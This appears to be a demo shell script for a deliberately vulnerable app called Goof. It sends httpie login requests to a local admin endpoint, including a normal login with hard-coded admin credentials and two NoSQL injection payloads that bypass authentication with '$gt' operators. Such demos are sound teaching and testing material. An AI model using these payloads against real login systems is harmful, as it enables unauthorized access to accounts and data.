
if [ -z "$GOOF_HOST" ]; then
	export GOOF_HOST=http://localhost:3001
fi

# Default working case - form fill
echo -n 'username=admin&password=SuperSecretPassword' | http --form $GOOF_HOST/admin -v

# JSON working login
echo '{"username":"admin", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/admin -v

# failed login
echo '{"username":"admin", "password":"WrongPassword"}' | http --json $GOOF_HOST/admin -v

# successful login, NOSQL Injection, knowing the username
echo '{"username": "admin", "password": {"$gt": ""}}' | http --json $GOOF_HOST/admin -v

# successful login, NOSQL Injection, without knowing the username
echo '{"username": {"$gt": ""}, "password": {"$gt": ""}}' | http --json $GOOF_HOST/admin -v

